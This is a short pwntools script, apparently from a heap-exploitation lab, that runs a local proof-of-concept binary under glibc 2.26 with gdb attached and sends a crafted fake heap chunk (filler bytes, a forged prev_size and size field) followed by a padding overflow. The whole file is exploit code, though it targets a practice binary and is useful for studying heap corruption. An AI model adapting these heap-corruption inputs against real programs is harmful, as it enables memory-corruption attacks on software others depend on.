'''
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.26/libc-2.26.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = './.poc-2.26' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.26/ 
''') 

else: 
	p = process(elf.path, env=env) 

fake_chunk = "B" * 0x30 # Filler
fake_chunk += p64(0x0) # prev_size
fake_chunk += p64(0x150) # size
p.sendline(fake_chunk) 

p.sendline("C" * 0x140) 
p.interactive()
